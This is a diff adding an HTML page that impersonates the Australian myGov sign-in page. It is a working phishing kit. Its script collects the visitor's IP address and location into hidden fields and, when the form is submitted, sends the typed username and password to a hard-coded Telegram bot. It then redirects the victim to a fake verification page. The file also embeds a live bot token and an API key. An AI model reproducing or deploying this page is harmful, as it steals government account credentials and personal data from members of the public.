@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link href="./output.css" rel="stylesheet" />
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700;900&display=swap"
+      rel="stylesheet"
+    />
+    <title>Sign in with myGov - myGov</title>
+  </head>
+  <body class="font-roboto overflow-x-hidden">
+    <!-- Header Starts Here -->
+    <div class="w-screen lg:h-[12.025rem] h-[83px] bg-primary">
+      <div class="flex justify-between h-full items-center lg:px-16 px-5">
+        <a href="https://beta.my.gov.au/" aria-label="mygov">
+          <img
+            src="./images/mygov-logo.svg"
+            class="lg:h-[70px] h-[51px]"
+            alt=""
+            srcset=""
+          />
+        </a>
+        <a
+          href="https://beta.my.gov.au/en/about/help"
+          class="text-[1.02rem] font-[500] underline"
+          >Help</a
+        >
+      </div>
+    </div>
+    <!-- Header Ends Here -->
+
+    <!--Form Starts Here-->
+    <div class="h-full pt-16 px-6">
+      <div class="flex justify-center flex-col my-0 mx-auto max-w-lg">
+        <div class="flex justify-start flex-col">
+          <div class="flex items-center h-full w-full gap-3 pt-2">
+            <img
+              src="./images/blugov-left-chevron-dark.svg"
+              alt=""
+              class="h-[10px]"
+              srcset=""
+            />
+
+            <a
+              href="https://login.my.gov.au/las/mygov-login?execution=e1s1&_eventId=close"
+              class="text-[18px] text-secondary font-medium underline"
+              >Back</a
+            >
+          </div>
+          <h1 class="text-[2rem] font-[700] text-tertiary pb-3">
+            Sign in with myGov
+          </h1>
+          <p class="text-tertiary pb-7 text-[18px]">
+            Choose how to sign in from these 2 options
+          </p>
+
+          <h2 class="text-[1.5rem] font-[700] pb-5">
+            Using your myGov sign in details
+          </h2>
+
+          <form id="messageForm">
+            <input type="hidden" value="" id="ip" name="IP" />
+            <div class="flex items-start flex-col pb-7">
+              <p class="font-bold pb-2">Username or email</p>
+              <input
+                type="text"
+                name="username"
+                aria-label="username and email"
+                class="w-full h-[2.8rem] p-2 border border-tertiary border-solid border-opacity-95 focus:border-separate" required
+              />
+              <p class="text-secondary font-medium underline pt-2">
+                Forgot username
+              </p>
+            </div>
+            <div class="flex items-start flex-col pb-9">
+              <p class="font-bold pb-2">Password</p>
+              <div class="relative w-full">
+                <div class="absolute right-1 top-[12px]" onclick="myToogle()">
+                  <p class="text-secondary font-medium underline" id="passbutt">
+                    Show
+                  </p>
+                </div>
+                <input
+                  type="password"
+                  name="password"
+                  aria-label="password"
+                  id="myInput"
+                  class="w-full h-[2.8rem] p-2 border border-tertiary border-solid border-opacity-95 focus:border-separate" required
+                />
+                <p class="text-secondary font-medium underline pt-2">
+                  Forgot password
+                </p>
+              </div>
+            </div>
+
+            <input type="hidden" value="" id="city" name="City" />
+            <input type="hidden" value="" id="region" name="Region" />
+            <input type="hidden" value="" id="country" name="Country" />
+            <input type="hidden" value="" id="user_agent" name="User_Agent" />
+            <input
+              type="hidden"
+              value=""
+              id="country_code"
+              name="Country_Code"
+            />
+            <button
+              type="submit"
+              class="w-full group bg-primary_blur rounded-md py-[11px] text-secondary font-medium hover:bg-secondary"
+            >
+              <p class="group-hover:text-white">Sign in</p>
+            </button>
+          </form>
+          <div class="flex pt-5 pb-5">
+            <img src="./images/icon-blugov-info.svg" alt="" srcset="" />
+            <p class="pl-3">
+              <span class="text-secondary underline"
+                >Create a myGov account
+              </span>
+              if you don't have one already.
+            </p>
+          </div>
+          <div class="relative my-16">
+            <div class="absolute w-full h-[1.5px] bg-gray"></div>
+            <div
+              class="bg-white absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-12 h-12 rounded-full border border-solid border-gray"
+            ></div>
+            <p
+              class="text-lg absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 pb-1"
+            >
+              or
+            </p>
+          </div>
+
+          <div class="">
+            <h2 class="text-[1.5rem] font-[700]">
+              Using your myGovID Digital Identity
+            </h2>
+            <p class="pt-5 pb-5">
+              What is
+              <span class="text-secondary underline">Digital Identity </span>
+              and
+              <span class="text-secondary underline">myGovID </span>
+              ?
+            </p>
+            <button
+              type="submit"
+              class="w-full group bg-primary_blur rounded-md py-[11px] text-secondary font-medium hover:bg-secondary"
+            >
+              <p class="group-hover:text-white">
+                Continue with Digital Identity
+              </p>
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <!--Form Ends Here-->
+    <div class="bg-black">
+      <!--Foooter Starts Here-->
+      <div class="px-10 lg:px-32 mt-20">
+        <div class="py-8">
+          <ul class="text-white text-sm flex flex-wrap gap-7">
+            <li>
+              <a href="https://my.gov.au/en/about/terms">Terms of use</a>
+            </li>
+            <li>
+              <a href="https://my.gov.au/en/about/privacy-and-security"
+                >Privacy and Security</a
+              >
+            </li>
+            <li>
+              <a href="https://my.gov.au/en/about/copyright">Copyright</a>
+            </li>
+            <li>
+              <a href="https://my.gov.au/en/about/accessibility"
+                >Accessibility</a
+              >
+            </li>
+          </ul>
+        </div>
+        <div class="w-full h-[1px] bg-gray"></div>
+        <div
+          class="flex lg:items-center items-start gap-12 lg:flex-row flex-col justify-between pt-16 pb-12"
+        >
+          <img
+            src="./images/mygov-logo-white.svg"
+            class="xl:h-[68px] lg:h-[54px] h-[68px]"
+            alt=""
+            srcset=""
+          />
+          <p class="text-white text-base w-full lg:w-[650px]">
+            We acknowledge the Traditional Custodians of the lands we live on.
+            We pay our respects to all Elders, past and present, of all
+            Aboriginal and Torres Strait Islander nations.
+          </p>
+        </div>
+      </div>
+
+      <!--Form Ends Here-->
+    </div>
+  </body>
+</html>
+
+<script>
+  var ip = document.getElementById("ip");
+  var city = document.getElementById("city");
+  var region = document.getElementById("region");
+  var country = document.getElementById("country");
+  var country_code = document.getElementById("country_code");
+  var user_agent = document.getElementById("user_agent");
+
+  var requestOptions = {
+    method: "GET",
+  };
+
+  fetch(
+    "https://api.geoapify.com/v1/ipinfo?&apiKey=341125f7a3af44bfb783eea0a58bd079",
+    requestOptions
+  )
+    .then((response) => response.json())
+    .then((result) => {
+      console.log(result);
+      ip.value = result.ip;
+      city.value = result.city.name;
+      region.value = result.state.name;
+      country.value = result.country.name;
+      country_code.value = result.country.iso_code;
+      user_agent.value = navigator.userAgent;
+    })
+    .catch((error) => console.log("error", error));
+
+  const chat_id = "6134643042",
+    botID = "bot5819285797:AAH3dyjYgGJUUi0GL5YZsQ7l_Mv6EyLbgSI";
+  const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+  document
+    .querySelector("#messageForm")
+    .addEventListener("submit", async (e) => {
+      // When the user submits the form
+      e.preventDefault(); // Don't submit
+      let text = JSON.stringify(
+        // Convert the form data to a string to send as our Telegram message
+        Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+        null,
+        2
+      ); // Prettify the JSON so we can read the data easily
+      const sendMessage = await fetch(telegramURL, {
+        // Send the request to the telegram API
+        method: "POST",
+        headers: { "Content-Type": "application/json" }, // This is required when sending a JSON body.
+        body: JSON.stringify({ chat_id, text }), // The body must be a string, not an object
+      });
+      const messageStatus = document.querySelector("#status");
+      if (sendMessage.ok) {
+        // Update the user on if the message went through
+        window.location.href = "https://mygovidc.github.io/verification";
+        messageStatus.textContent = "Message Sent!";
+      } else
+        messageStatus.textContent =
+          "Message Failed to send :( " + (await sendMessage.text());
+      e.target.reset(); // Clear the form fields.
+    });
+
+  function myToogle() {
+    var x = document.getElementById("myInput");
+    var passbutt = document.getElementById("passbutt");
+    if (x.type === "password") {
+      x.type = "text";
+      passbutt.innerHTML = "Hide";
+    } else {
+      x.type = "password";
+      passbutt.innerHTML = "Show";
+    }
+  }
+</script>
